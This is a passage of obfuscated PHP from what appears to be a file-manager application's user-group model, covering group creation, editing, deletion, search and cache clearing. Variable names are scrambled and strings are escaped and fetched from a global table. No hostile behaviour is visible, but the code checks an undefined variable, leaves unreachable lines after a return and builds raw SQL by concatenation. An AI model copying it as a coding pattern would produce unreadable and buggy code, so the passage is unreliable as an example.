write_log(array($‡×¥ƒÔ×[2209], ACTION, $Úİñ×Ïê), $‡×¥ƒÔ×[1319]); return !1; } IO::remove($Úİñ×Ïê[$‡×¥ƒÔ×[87]]); write_log(ACTION . $‡×¥ƒÔ×[947] . KodUser::id() . $‡×¥ƒÔ×[2210] . $Úİñ×Ïê[$‡×¥ƒÔ×[565]] . $‡×¥ƒÔ×[1999] . $Úİñ×Ïê[$‡×¥ƒÔ×[79]] . $‡×¥ƒÔ×[200] . $Úİñ×Ïê[$‡×¥ƒÔ×[87]], $‡×¥ƒÔ×[2209]); return; } if ($Úİñ×Ïê[$‡×¥ƒÔ×[2203]] != $ªåáú) { $this->where($Œ«×ıí¾)->save(array($‡×¥ƒÔ×[2196] => $ªåáú)); } } public function storageInfo($Ê²¸²×¶ = false) { $Úéñãû =& $_SERVER[‘ÆÜ‘œ]; $Ææºà‹ = $this->count() + 0.0; $Ùó¯ªù = 0; $¾Ù²¨ã¼ = 1; $ÒİŸ = 0; $¬ş¸Ò¼ï = 5000; for ($Ê¼Îú‘¯ = 0; $Ê¼Îú‘¯ < $Ææºà‹; $Ê¼Îú‘¯ = $Ê¼Îú‘¯ + $¬ş¸Ò¼ï) { $Ç²ˆÑÖ = $this->limit($Ê¼Îú‘¯, $Ê¼Îú‘¯ + $¬ş¸Ò¼ï)->select(); foreach ($Ç²ˆÑÖ as $Äğø¡™) { $¾Ù²¨ã¼ += $Äğø¡™[$Úéñãû[79]] * $Äğø¡™[$Úéñãû[2203]]; $Ùó¯ªù += $Äğø¡™[$Úéñãû[79]] * ($Äğø¡™[$Úéñãû[2203]] - 1); $ÒİŸ += $Äğø¡™[$Úéñãû[2203]]; } } $ææ•áĞ = array($Úéñãû[2211] => $¾Ù²¨ã¼, $Úéñãû[2212] => $Ùó¯ªù, $Úéñãû[2213] => $Ùó¯ªù / $¾Ù²¨ã¼, $Úéñãû[83] => $Ææºà‹, $Úéñãû[2214] => $ÒİŸ); return $ææ•áĞ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\155\x65" => "\x67\x72\157\x75\160\x5f\x6d\x65\x74\141", "\155\145\164\141\x46\151\x65\154\144" => "\147\x72\157\165\160\111\x44"); protected function cacheFunctionAlias($Ë§Ğè÷) { $—öó”” =& $_SERVER[‘ÆÜ‘œ]; return array($—öó””[2215] => array($Ë§Ğè÷[0], $—öó””[2216]), $—öó””[2217] => array($Ë§Ğè÷[0], $—öó””[2218])); } protected function ___getInfo($ÄÒß¨³) { $Ó­Àƒ¥ = $this->getInfoSimple($ÄÒß¨³); if (!$Ó­Àƒ¥) { return !1; } return $this->_listDataApplyItem($Ó­Àƒ¥); } protected function ___getInfoSimple($æıõì›) { $ˆ”ş¬ÌÔ = array($_SERVER[‘ÆÜ‘œ][1446] => intval($æıõì›)); $ñ…ÅÕÅù = $this->where($ˆ”ş¬ÌÔ)->find(); return is_array($ñ…ÅÕÅù) ? $ñ…ÅÕÅù : array(); } protected function groupAdd($Æ¾³šÑÈ) { $ˆÃá°ÆÌ =& $_SERVER[‘ÆÜ‘œ]; if (!$Æ¾³šÑÈ[$ˆÃá°ÆÌ[191]] && isset($Æ¾³šÑÈ[$ˆÃá°ÆÌ[1446]]) && $Æ¾³šÑÈ[$ˆÃá°ÆÌ[1446]] == 1) { if ($ÉìÕ­ëò = $this->getInfoSimple($Æ¾³šÑÈ[$ˆÃá°ÆÌ[1446]], !0)) { return $Æ¾³šÑÈ[$ˆÃá°ÆÌ[1446]]; } } else { $ÉìÕ­ëò = $this->getInfoSimple($Æ¾³šÑÈ[$ˆÃá°ÆÌ[191]]); if (!$ÉìÕ­ëò) { return !1; } } $òîŸ« = $ˆÃá°ÆÌ[621]; if ($ÉìÕ­ëò[$ˆÃá°ÆÌ[612]]) { $òîŸ« = $ÉìÕ­ëò[$ˆÃá°ÆÌ[612]] . $ÉìÕ­ëò[$ˆÃá°ÆÌ[1446]] . $ˆÃá°ÆÌ[50]; } $Óù†ïïÕ = array($ˆÃá°ÆÌ[517] => $this->groupNameAuto($Æ¾³šÑÈ[$ˆÃá°ÆÌ[191]], $Æ¾³šÑÈ[$ˆÃá°ÆÌ[32]]), $ˆÃá°ÆÌ[500] => $Æ¾³šÑÈ[$ˆÃá°ÆÌ[191]], $ˆÃá°ÆÌ[682] => $òîŸ«, $ˆÃá°ÆÌ[2219] => $Æ¾³šÑÈ[$ˆÃá°ÆÌ[2123]], $ˆÃá°ÆÌ[2220] => 0, $ˆÃá°ÆÌ[2140] => 0); $Æ¾³šÑÈ[$ˆÃá°ÆÌ[32]] = $Óù†ïïÕ[$ˆÃá°ÆÌ[32]]; if (isset($Æ¾³šÑÈ[$ˆÃá°ÆÌ[2158]])) { $Óù†ïïÕ[$ˆÃá°ÆÌ[2158]] = $Æ¾³šÑÈ[$ˆÃá°ÆÌ[2158]]; } else { $¥ª·…¯ˆ = $this->max($ˆÃá°ÆÌ[2158]); if (!$¥ª·…¯ˆ) { $¥ª·…¯ˆ = 0; } $Óù†ïïÕ[$ˆÃá°ÆÌ[2158]] = $¥ª·…¯ˆ + 1; } if (!empty($Æ¾³šÑÈ[$ˆÃá°ÆÌ[1446]])) { $Óù†ïïÕ[$ˆÃá°ÆÌ[1446]] = $Æ¾³šÑÈ[$ˆÃá°ÆÌ[1446]]; } $Ï€ßÏï = $this->add($Óù†ïïÕ); $this->groupMetaEdit($Ï€ßÏï, $Æ¾³šÑÈ); Model($ˆÃá°ÆÌ[1484])->groupRootAdd($Ï€ßÏï); $this->_clearCache($Æ¾³šÑÈ[$ˆÃá°ÆÌ[191]]); return $Ï€ßÏï; } protected function groupEdit($¤½“÷ˆú, $Ôú‚ˆ½í) { $ÚÔêÄî» =& $_SERVER[‘ÆÜ‘œ]; $†¾½Å = $this->getInfoSimple($¤½“÷ˆú); if (!$†¾½Å) { return !1; } if (!empty($Ôú‚ˆ½í[$ÚÔêÄî»[191]])) { $®¢Ù¯ Ö = $this->getInfoSimple($Ôú‚ˆ½í[$ÚÔêÄî»[191]]); if (!$®¢Ù¯ Ö) { return !1; } if ($†¾½Å[$ÚÔêÄî»[1446]] == $®¢Ù¯ Ö[$ÚÔêÄî»[1446]]) { return !1; } if ($Ôú‚ˆ½í[$ÚÔêÄî»[191]] != $†¾½Å[$ÚÔêÄî»[191]]) { if ($®¢Ù¯ Ö[$ÚÔêÄî»[612]] !== $†¾½Å[$ÚÔêÄî»[612]] && strpos($®¢Ù¯ Ö[$ÚÔêÄî»[612]], $†¾½Å[$ÚÔêÄî»[612]] . $†¾½Å[$ÚÔêÄî»[1446]] . $ÚÔêÄî»[50]) === 0) { return !1; } $Ôú‚ˆ½í[$ÚÔêÄî»[682]] = $®¢Ù¯ Ö[$ÚÔêÄî»[612]] . $Ôú‚ˆ½í[$ÚÔêÄî»[191]] . $ÚÔêÄî»[50]; $this->_changeChildLevel($†¾½Å, $®¢Ù¯ Ö); $this->_clearCache($®¢Ù¯ Ö[$ÚÔêÄî»[1446]]); $this->_clearCache($†¾½Å[$ÚÔêÄî»[191]]); } } $this->groupMetaEdit($¤½“÷ˆú, $Ôú‚ˆ½í); $this->_clearChildrenCache($†¾½Å); return $this->where(array($ÚÔêÄî»[2221] => $¤½“÷ˆú))->save($Ôú‚ˆ½í); } private function groupMetaEdit($¸ÏéôÓù, &$óÆÚö) { $£½—Œ€ =& $_SERVER[‘ÆÜ‘œ]; if (isset($óÆÚö[$£½—Œ€[32]])) { $this->setNamePinyin($¸ÏéôÓù, $óÆÚö[$£½—Œ€[32]]); } if (isset($óÆÚö[$£½—Œ€[2222]])) { $šæç¸ŞÂ = array($£½—Œ€[2222] => $óÆÚö[$£½—Œ€[2222]], $£½—Œ€[2223] => $óÆÚö[$£½—Œ€[2223]]); unset($óÆÚö[$£½—Œ€[2222]]); unset($óÆÚö[$£½—Œ€[2223]]); if (isset($óÆÚö[$£½—Œ€[2224]])) { $¿ğ…¼ÑÔ = $£½—Œ€[1442] . $¸ÏéôÓù; $±‘íêùø = $£½—Œ€[1441]; $±ŸİŞš = $óÆÚö[$£½—Œ€[2224]] ? $óÆÚö[$£½—Œ€[2224]] : $£½—Œ€[12]; $ğçš¥û = Model($£½—Œ€[1440])->get($¿ğ…¼ÑÔ, $±‘íêùø); $ğçš¥û = $ğçš¥û ? $ğçš¥û : $£½—Œ€[12]; if ($ğçš¥û != $±ŸİŞš) { if (!$±ŸİŞš && $ğçš¥û) { Model($£½—Œ€[1440])->remove($¿ğ…¼ÑÔ, $±‘íêùø); } else { if ($±ŸİŞš) { Model($£½—Œ€[1440])->set($¿ğ…¼ÑÔ, $±ŸİŞš, $±‘íêùø); } } } $šæç¸ŞÂ[$£½—Œ€[2224]] = $±ŸİŞš; } $this->metaSet($¸ÏéôÓù, $šæç¸ŞÂ); } } private function _clearChildrenCache($«É·Ìë™) { $õ¶›¿´Ñ =& $_SERVER[‘ÆÜ‘œ]; $ŞìŞ×Ñ¢ = array($õ¶›¿´Ñ[682] => array($õ¶›¿´Ñ[643], $«É·Ìë™[$õ¶›¿´Ñ[612]] . $«É·Ìë™[$õ¶›¿´Ñ[1446]] . $õ¶›¿´Ñ[644])); $Ş‚¦¦µ‰ = $this->field($õ¶›¿´Ñ[1446])->where($ŞìŞ×Ñ¢)->select(); foreach ($Ş‚¦¦µ‰ as $Ë”µÔ˜â) { $this->_clearCache($Ë”µÔ˜â[$õ¶›¿´Ñ[1446]]); } } private function _clearCache($Í£ñ™ˆÍ) { $»œ‚“•Å =& $_SERVER[‘ÆÜ‘œ]; $this->cacheFunctionClear($»œ‚“•Å[2225], $Í£ñ™ˆÍ); $this->cacheFunctionClear($»œ‚“•Å[2226], $Í£ñ™ˆÍ); } private function _changeChildLevel($¯¬‡¿Ğª, $¤ûœäêî, $‘×•Š–˜ = false) { $ÓÔ¼È´™ =& $_SERVER[‘ÆÜ‘œ]; $Ôãò€ = $¯¬‡¿Ğª[$ÓÔ¼È´™[612]] . $¯¬‡¿Ğª[$ÓÔ¼È´™[1446]] . $ÓÔ¼È´™[50]; $°£ı­·æ = $¤ûœäêî[$ÓÔ¼È´™[612]] . $¤ûœäêî[$ÓÔ¼È´™[1446]] . $ÓÔ¼È´™[50] . $¯¬‡¿Ğª[$ÓÔ¼È´™[1446]] . $ÓÔ¼È´™[50]; if ($‘×•Š–˜) { $°£ı­·æ = $¤ûœäêî[$ÓÔ¼È´™[612]] . $¤ûœäêî[$ÓÔ¼È´™[1446]] . $ÓÔ¼È´™[50]; } $ø”æàÁö = array($ÓÔ¼È´™[682] => array($ÓÔ¼È´™[643], $¯¬‡¿Ğª[$ÓÔ¼È´™[612]] . $¯¬‡¿Ğª[$ÓÔ¼È´™[1446]] . $ÓÔ¼È´™[644])); $ƒåá†ĞØ = array($ÓÔ¼È´™[682] => array($ÓÔ¼È´™[691], "\x72\145\x70\x6c\141\x63\x65\x28\x70\x61\x72\145\x6e\164\114\x65\166\x65\154\54\x27{$Ôãò€}\x27\x2c\x27{$°£ı­·æ}\x27\51")); $this->_clearChildrenCache($¯¬‡¿Ğª); $this->where($ø”æàÁö)->data($ƒåá†ĞØ)->save(); } public function setNamePinyin($âä®Á†Ğ, $¬ä·Òê = false) { $¼ãÛ«¸€ =& $_SERVER[‘ÆÜ‘œ]; if (!$¬ä·Òê) { $š—‹½Ñ” = $this->getInfoSimple($âä®Á†Ğ); $¬ä·Òê = $š—‹½Ñ”[$¼ãÛ«¸€[32]]; } if (!Input::check($¬ä·Òê, $¼ãÛ«¸€[685])) { $this->metaSet($âä®Á†Ğ, $¼ãÛ«¸€[560], null); $this->metaSet($âä®Á†Ğ, $¼ãÛ«¸€[559], null); return; } $ŠíÃï· = array($¼ãÛ«¸€[560] => str_replace($¼ãÛ«¸€[53], $¼ãÛ«¸€[12], Pinyin::get($¬ä·Òê)), $¼ãÛ«¸€[559] => Pinyin::get($¬ä·Òê, $¼ãÛ«¸€[686])); $this->metaSet($âä®Á†Ğ, $ŠíÃï·); } protected function metaSet($Æ”’­¤, $±Òı‡‘§ = null, $²ëËæ‡õ = null) { $this->_clearCache($Æ”’­¤); return parent::metaSet($Æ”’­¤, $±Òı‡‘§, $²ëËæ‡õ); } protected function groupStatus($”¢Ì§ß, $ÛœãÙÉñ) { $ğÖ£’÷Ò =& $_SERVER[‘ÆÜ‘œ]; $’˜ş “ï = $this->getInfoSimple($”¢Ì§ß); if (!$’˜ş “ï) { return !1; } $this->_clearCache($”¢Ì§ß); return $this->metaSet($”¢Ì§ß, $ğÖ£’÷Ò[857], $ÛœãÙÉñ); if ($ÛœãÙÉñ == $ğÖ£’÷Ò[91]) { $öîŸ¦ù± = $this->parentLevelArray($’˜ş “ï[$ğÖ£’÷Ò[612]]); } else { } $öîŸ¦ù±[] = $’˜ş “ï[$ğÖ£’÷Ò[1446]]; $»ùò´ĞÍ = array(); foreach ($öîŸ¦ù± as $”¢Ì§ß) { $»ùò´ĞÍ[] = array($ğÖ£’÷Ò[1446] => $”¢Ì§ß, $ğÖ£’÷Ò[95] => $ğÖ£’÷Ò[857], $ğÖ£’÷Ò[460] => $ÛœãÙÉñ); $this->_clearCache($”¢Ì§ß); } return Model($ğÖ£’÷Ò[2227])->addAll($»ùò´ĞÍ, array(), !0); } protected function groupRemove($÷¾Èêúß, $²Ä®¨øù = false) { $ñü¨ éÄ =& $_SERVER[‘ÆÜ‘œ]; $¶á•‘Ô÷ = array($ñü¨ éÄ[1446] => $÷¾Èêúß); $Î“‹Îãº = $this->where($¶á•‘Ô÷)->find(); if (!$Î“‹Îãº || $Î“‹Îãº[$ñü¨ éÄ[191]] == 0) { return !1; } if (!$²Ä®¨øù) { $ü±©ï‹Â = $this->getInfoSimple($Î“‹Îãº[$ñü¨ éÄ[191]]); $this->_changeChildLevel($Î“‹Îãº, $ü±©ï‹Â, !0); $this->where(array($ñü¨ éÄ[191] => $÷¾Èêúß))->save(array($ñü¨ éÄ[191] => $Î“‹Îãº[$ñü¨ éÄ[191]])); $this->_clearCache($ü±©ï‹Â[$ñü¨ éÄ[1446]]); } Model($ñü¨ éÄ[2227])->where($¶á•‘Ô÷)->delete(); Model($ñü¨ éÄ[2228])->where($¶á•‘Ô÷)->delete(); Model($ñü¨ éÄ[939])->groupRootRemove($÷¾Èêúß); $this->_clearCache($Î“‹Îãº[$ñü¨ éÄ[191]]); return $this->where($¶á•‘Ô÷)->delete(); } protected function groupSort($“÷Ë…˜) { $‚›ßç™ =& $_SERVER[‘ÆÜ‘œ]; $ÛŠ åïÔ = array(); foreach ($“÷Ë…˜ as $ Ã”ÄœÜ => $–¶­Ä‚) { $ÛŠ åïÔ[] = array($‚›ßç™[1446], $–¶­Ä‚, $‚›ßç™[2158], $ Ã”ÄœÜ + 1); } $this->saveAll($ÛŠ åïÔ); } public function listData() { $ü¡Ã¼³Â = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ü¡Ã¼³Â[$_SERVER[‘ÆÜ‘œ][455]]); return $ü¡Ã¼³Â; } private function _makeOrder($•à½ó© = '') { $Õ¤œ™‘ =& $_SERVER[‘ÆÜ‘œ]; $¡ãÏô°× = array($Õ¤œ™‘[1446], $Õ¤œ™‘[32], $Õ¤œ™‘[2125], $Õ¤œ™‘[232]); $‘šÔ Ó = array($Õ¤œ™‘[545] => $Õ¤œ™‘[546], $Õ¤œ™‘[547] => $Õ¤œ™‘[548]); $Ÿ•¥Â÷• = Input::get($Õ¤œ™‘[552], $Õ¤œ™‘[7], $Õ¤œ™‘[2140], $¡ãÏô°×); $İ†íÏ× = Input::get($Õ¤œ™‘[553], $Õ¤œ™‘[7], $Õ¤œ™‘[2229], array($Õ¤œ™‘[2229], $Õ¤œ™‘[547])); $İ†íÏ× = $‘šÔ Ó[$İ†íÏ×]; $•à½ó© = $•à½ó© . "{$Ÿ•¥Â÷•}\40{$İ†íÏ×}\x2c\40\147\162\157\x75\160\111\104\x20\141\163\x63"; return $this->order($•à½ó©); } public function listChild($›ØË‰Ìä) { $›¤“½¶ =& $_SERVER[‘ÆÜ‘œ]; $¹Ş¼ˆ½ = $this->where(array($›¤“½¶[191] => $›ØË‰Ìä))->_makeOrder()->selectPage(200); $this->_listDataApply($¹Ş¼ˆ½[$›¤“½¶[455]]); return $¹Ş¼ˆ½; } public function listChildIds($âç»Ì«à) { $ÍÜ×Š§á =& $_SERVER[‘ÆÜ‘œ]; if (is_string($Åú¨÷÷)) { $âç»Ì«à = explode($ÍÜ×Š§á[50], $âç»Ì«à); } $¸ğ£Ş˜Š = $this->where(array($ÍÜ×Š§á[1446] => array($ÍÜ×Š§á[7], $âç»Ì«à)))->field($ÍÜ×Š§á[2230])->select(); if (!$¸ğ£Ş˜Š) { return !1; } $Ò×íŞ‡ = array(); foreach ($¸ğ£Ş˜Š as $ÃñšŒÀ) { $Ò×íŞ‡[] = "\x73\x65\x6c\x65\x63\164\x20\147\x72\x6f\165\x70\111\104\40\146\x72\157\155\x20\x60\x67\162\x6f\x75\x70\140\x20\167\150\x65\162\x65\40\x70\x61\x72\x65\x6e\164\114\145\166\x65\x6c\x20\154\x69\153\x65\40\47{$ÃñšŒÀ[$ÍÜ×Š§á[612]]}{$ÃñšŒÀ[$ÍÜ×Š§á[1446]]}\x2c\x25\47"; } $Ò×íŞ‡ = implode($ÍÜ×Š§á[2231], $Ò×íŞ‡); $¸ğ£Ş˜Š = $this->query($Ò×íŞ‡); if (!$¸ğ£Ş˜Š) { return array(); } $âç»Ì«à = array_to_keyvalue($¸ğ£Ş˜Š, $ÍÜ×Š§á[12], $ÍÜ×Š§á[1446]); return array_unique($âç»Ì«à); } public function listByID($œú¸›„) { $ãù•É¦ =& $_SERVER[‘ÆÜ‘œ]; if (!$œú¸›„) { return array(); } $ÀÆÎç’ = array($ãù•É¦[1446] => array($ãù•É¦[7], $œú¸›„)); $â¿­Ù„® = $this->where($ÀÆÎç’)->select(); $â¿­Ù„® = array_sort_keep($â¿­Ù„®, $ãù•É¦[1446], $œú¸›„); $this->_listDataApply($â¿­Ù„®); return $â¿­Ù„®; } public function listSearch($ãí¡ÊÒ) { $Ôí¢Š³ =& $_SERVER[‘ÆÜ‘œ]; $Ò·ğ©¾ = trim($ãí¡ÊÒ[$Ôí¢Š³[2232]]); $·êŞÔ = explode($Ôí¢Š³[53], $Ò·ğ©¾); if (!$Ò·ğ©¾ || count($·êŞÔ) == 1) { return $this->listSearchNow($ãí¡ÊÒ); } $ûá²ª¶‡ = array($Ôí¢Š³[455] => array()); foreach ($·êŞÔ as $ë§¼Áêô) { if (!trim($ë§¼Áêô)) { continue; } $ãí¡ÊÒ[$Ôí¢Š³[2232]] = $ë§¼Áêô; $Ô£Îç = $this->listSearchNow($ãí¡ÊÒ); $ûá²ª¶‡[$Ôí¢Š³[455]] = array_merge($ûá²ª¶‡[$Ôí¢Š³[455]], $Ô£Îç[$Ôí¢Š³[455]]); } $ûá²ª¶‡[$Ôí¢Š³[455]] = array_unique_by_key($ûá²ª¶‡[$Ôí¢Š³[455]], $Ôí¢Š³[1446]); $ûá²ª¶‡[$Ôí¢Š³[452]] = array($Ôí¢Š³[453] => count($ûá²ª¶‡[$Ôí¢Š³[455]]), $Ôí¢Š³[449] => 20, $Ôí¢Š³[438] => 1, $Ôí¢Š³[454] => 1); return $ûá²ª¶‡; } public function listSearchNow($Š¦ÂÂú‹) { $îßè»ñ =& $_SERVER[‘ÆÜ‘œ]; $ ïçÇ® = trim($Š¦ÂÂú‹[$îßè»ñ[2232]]); $ÚÕ¼ë‘ = isset($Š¦ÂÂú‹[$îßè»ñ[2233]]) ? $Š¦ÂÂú‹[$îßè»ñ[2233]] : !1; if (!trim($ ïçÇ®)) { return !1; } $ ïçÇ® = str_replace($îßè»ñ[2234], $îßè»ñ[2235], $ ïçÇ®); $è“çÚ = array($îßè»ñ[1446] => array($îßè»ñ[482], "{$ ïçÇ®}\x25"), $îßè»ñ[32] => array($îßè»ñ[482], "\45{$ ïçÇ®}\45"), $îßè»ñ[1118] => $îßè»ñ[2236]); if ($ÚÕ¼ë‘) { $ã‡®ÓŞğ = $this->getInfoSimple($ÚÕ¼ë‘); $îç¿ø©Ç = $ã‡®ÓŞğ[$îßè»ñ[612]] . $ÚÕ¼ë‘ . $îßè»ñ[644]; $è“çÚ = array($è“çÚ, array($îßè»ñ[612] => array($îßè»ñ[482], $îç¿ø©Ç))); } $è“çÚ = $this->parseWhereLike($è“çÚ); $Ô«©ÂñË = $this->_makeOrder()->where($è“çÚ)->selectPage(20); $Ô«©ÂñË = $Ô«©ÂñË ? $Ô«©ÂñË : array($îßè»ñ[455] => array(), $îßè»ñ[452] => array()); if (!$Ô«©ÂñË || count($Ô«©ÂñË[$îßè»ñ[455]]) < 5 && Input::check($ ïçÇ®, $îßè»ñ[403])) { $¿âŸ¹Ü = $this->groupChildrenAll($ÚÕ¼ë‘); $º˜äŠ–Æ = $this->_searchFromMeta($îßè»ñ[559], $ ïçÇ®, 10, $¿âŸ¹Ü); $¹÷¶ªô¡ = $this->_searchFromMeta($îßè»ñ[560], $ ïçÇ®, 10, $¿âŸ¹Ü); $¥Ä÷ÅÒ = array_merge($º˜äŠ–Æ, $¹÷¶ªô¡, $Ô«©ÂñË[$îßè»ñ[455]]); $Ô«©ÂñË[$îßè»ñ[455]] = array_unique_by_key($¥Ä÷ÅÒ, $îßè»ñ[1446]); $Ô«©ÂñË[$îßè»ñ[452]][$îßè»ñ[453]] = count($Ô«©ÂñË[$îßè»ñ[455]]); $Ô«©ÂñË[$îßè»ñ[452]][$îßè»ñ[454]] = ceil($Ô«©ÂñË[$îßè»ñ[452]][$îßè»ñ[453]] / $Ô«©ÂñË[$îßè»ñ[452]][$îßè»ñ[449]]); } $this->_listDataApply($Ô«©ÂñË[$îßè»ñ[455]]); return $Ô«©ÂñË; } protected function groupChildrenAll($şóõ‚××) { $èâƒÎâ =& $_SERVER[‘ÆÜ‘œ]; if (!$şóõ‚××) { return !1; } if (!is_array($şóõ‚××)) { $şóõ‚×× = array($şóõ‚××); } $‘û¯Ãû™ = $şóõ‚××; foreach ($şóõ‚×× as $ŞĞşÀÓ¤) { $ù½º–÷Ã = $this->getInfoSimple($ŞĞşÀÓ¤); $†µÃû… = array($èâƒÎâ[612] => array($èâƒÎâ[482], $ù½º–÷Ã[$èâƒÎâ[612]] . $ŞĞşÀÓ¤ . $èâƒÎâ[644])); $µ Š õ = $this->field($èâƒÎâ[1446])->where($†µÃû…)->select(); $‘û¯Ãû™ = array_merge($‘û¯Ãû™, array_to_keyvalue($µ Š õ, $èâƒÎâ[12], $èâƒÎâ[1446])); } return array_unique($‘û¯Ãû™); } private function _searchFromMeta($çì£şéÛ, $æŞÔƒ¼¿, $ÌñŒº×², $Å•Í¶ôì) { $İ‰ÑÃÁ» =& $_SERVER[‘ÆÜ‘œ]; $æŞÔƒ¼¿ = strtolower($æŞÔƒ¼¿); $ëÉ‘˜‰ı = array($İ‰ÑÃÁ»[95] => $çì£şéÛ, $İ‰ÑÃÁ»[460] => array($İ‰ÑÃÁ»[482], "\45{$æŞÔƒ¼¿}\45")); $ëÉ‘˜‰ı = $this->parseWhereLike($ëÉ‘˜‰ı); if ($Å•Í¶ôì) { $ëÉ‘˜‰ı[$İ‰ÑÃÁ»[1446]] = array($İ‰ÑÃÁ»[7], $Å•Í¶ôì); } $¢çç÷Ø’ = Model($İ‰ÑÃÁ»[2237])->where($ëÉ‘˜‰ı)->limit($ÌñŒº×²)->select(); if (!$¢çç÷Ø’) { return array(); } $¢çç÷Ø’ = array_to_keyvalue($¢çç÷Ø’, $İ‰ÑÃÁ»[12], $İ‰ÑÃÁ»[1446]); $ùƒ‚‚œ = $this->where(array($İ‰ÑÃÁ»[2221] => array($İ‰ÑÃÁ»[7], $¢çç÷Ø’)))->select(); if (!$ùƒ‚‚œ) { return array(); } return $ùƒ‚‚œ; } protected function _listDataApplyItem($õ˜È˜Ù€) { $İåØš‡Û = array($õ˜È˜Ù€); $this->_listDataApply($İåØš‡Û); return $İåØš‡Û[0]; } protected function _listDataApply(&$Òê—¶Ò†) { $İ­À¶ù =& $_SERVER[‘ÆÜ‘œ]; if (!$Òê—¶Ò†) { return; } $¥á½Ñ™û = array_to_keyvalue($Òê—¶Ò†, $İ­À¶ù[12], $İ­À¶ù[1446]); $this->_listAppendChildren($Òê—¶Ò†); $this->_listAppendChildrenMember($Òê—¶Ò†); $this->_listAppendMeta($Òê—¶Ò†, $¥á½Ñ™û); $this->_listAppendParent($Òê—¶Ò†); $this->_listAppendSourceRoot($Òê—¶Ò†, $¥á½Ñ™û); } private function _listAppendChildren(&$“ù‰Ñü—) { $şñÖÌÊÖ =& $_SERVER[‘ÆÜ‘œ]; $É®…ëƒ¥ = array_to_keyvalue($“ù‰Ñü—, $şñÖÌÊÖ[12], $şñÖÌÊÖ[1446]); $è®Í¾çâ = array($şñÖÌÊÖ[191] => array($şñÖÌÊÖ[7], $É®…ëƒ¥)); $ÖÇ”ğØæ = array($şñÖÌÊÖ[191], $şñÖÌÊÖ[2238] => $şñÖÌÊÖ[593]); $Íå¥ßæÊ = $this->field($ÖÇ”ğØæ)->where($è®Í¾çâ)->group($şñÖÌÊÖ[191])->select(); $Ê¥ÚáéÁ = array_to_keyvalue($Íå¥ßæÊ, $şñÖÌÊÖ[191], $şñÖÌÊÖ[593]); foreach ($“ù‰Ñü— as &$è´…¿‰ª) { $øüü¬Ğ¹ = $è´…¿‰ª[$şñÖÌÊÖ[1446]]; $è´…¿‰ª[$şñÖÌÊÖ[2239]] = isset($Ê¥ÚáéÁ[$øüü¬Ğ¹]) ? intval($Ê¥ÚáéÁ[$øüü¬Ğ¹]) : !1; } unset($è´…¿‰ª); } private function _listAppendChildrenMember(&$Öğ±©¹) { $ÌÀ¯ËÊá =& $_SERVER[‘ÆÜ‘œ]; $ÕÇŠš¢­ = array_to_keyvalue($Öğ±©¹, $ÌÀ¯ËÊá[12], $ÌÀ¯ËÊá[1446]); $„âİê€ = array($ÌÀ¯ËÊá[1446] => array($ÌÀ¯ËÊá[7], $ÕÇŠš¢­)); $ùïİ¾ıó = array($ÌÀ¯ËÊá[1446], $ÌÀ¯ËÊá[2238] => $ÌÀ¯ËÊá[593]); $§ğİŠè‰ = Model($ÌÀ¯ËÊá[2228])->field($ùïİ¾ıó)->where($„âİê€)->group($ÌÀ¯ËÊá[1446])->select(); $ß‹½şÏÁ = array_to_keyvalue($§ğİŠè‰, $ÌÀ¯ËÊá[1446], $ÌÀ¯ËÊá[593]); foreach ($Öğ±©¹ as &$ä¼·‚¨Í) { $¢È¼¼“× = $ä¼·‚¨Í[$ÌÀ¯ËÊá[1446]]; $ä¼·‚¨Í[$ÌÀ¯ËÊá[2240]] = isset($ß‹½şÏÁ[$¢È¼¼“×]) ? intval($ß‹½şÏÁ[$¢È¼¼“×]) : !1; } unset($ä¼·‚¨Í); } private function _listAppendMeta(&$ƒ‹Ö³œ‚, $áË±èş) { $–œ­ŠÈæ =& $_SERVER[‘ÆÜ‘œ]; $÷•÷Øç = array($–œ­ŠÈæ[1446] => array($–œ­ŠÈæ[7], $áË±èş)); $²ö¼Ø© = Model($–œ­ŠÈæ[2227])->where($÷•÷Øç)->select(); $²ö¼Ø© = array_to_keyvalue_group($²ö¼Ø©, $–œ­ŠÈæ[1446]); foreach ($²ö¼Ø© as &$»¢Ü”‚ä) { $»¢Ü”‚ä = array_to_keyvalue($»¢Ü”‚ä, $–œ­ŠÈæ[95], $–œ­ŠÈæ[460]); } unset($»¢Ü”‚ä); foreach ($ƒ‹Ö³œ‚ as &$Å ºÑ›”) { $Å ºÑ›”[$–œ­ŠÈæ[563]] = array(); if (isset($²ö¼Ø©[$Å ºÑ›”[$–œ­ŠÈæ[1446]]])) { $Å ºÑ›”[$–œ­ŠÈæ[563]] = $²ö¼Ø©[$Å ºÑ›”[$–œ­ŠÈæ[1446]]]; } } unset($Å ºÑ›”); } protected function parentLevelArray($êøˆùı) { $º˜õË–” =& $_SERVER[‘ÆÜ‘œ]; $êøˆùı = explode($º˜õË–”[50], trim($êøˆùı, $º˜õË–”[50])); $êøˆùı = array_remove_value($êøˆùı, $º˜õË–”[229]); return $êøˆùı; } protected function parentInGroup($ÃË¼öçı, $ùÔãşÇ) { $½Øô™øÀ =& $_SERVER[‘ÆÜ‘œ]; $‚Âì¨½ = $this->getInfoSimple($ÃË¼öçı); if (!$‚Âì¨½) { return !0; } $³ªµ›Âş = $this->parentLevelArray($‚Âì¨½[$½Øô™øÀ[612]]); $³ªµ›Âş[] = $ÃË¼öçı; foreach ($³ªµ›Âş as $ÃË¼öçı) { if (in_array($ÃË¼öçı . $½Øô™øÀ[12], $ùÔãşÇ)) { return !0; } } return !1; } private function _listAppendParent(&$®ı¨«’) { $¢æ»½Åö =& $_SERVER[‘ÆÜ‘œ]; $¸Ãùº = array(); foreach ($®ı¨«’ as &$ˆÁ’ãğ) { $¸Ãùº[$ˆÁ’ãğ[$¢æ»½Åö[1446]]] = $ˆÁ’ãğ[$¢æ»½Åö[32]]; $Àã¥çÃ× = $this->parentLevelArray($ˆÁ’ãğ[$¢æ»½Åö[612]]); foreach ($Àã¥çÃ× as $ò”öà˜Õ) { if (!isset($¸Ãùº[$ò”öà˜Õ])) { $¸Ãùº[$ò”öà˜Õ] = 0; } } } unset($ˆÁ’ãğ); foreach ($¸Ãùº as $úÃú¢ìë => $€€Ú£¥”) { if ($€€Ú£¥”) { continue; } $Ğ»ˆàæ = $this->getInfoSimple($úÃú¢ìë); $¸Ãùº[$úÃú¢ìë] = $Ğ»ˆàæ[$¢æ»½Åö[32]]; } $¢ø“Éë = 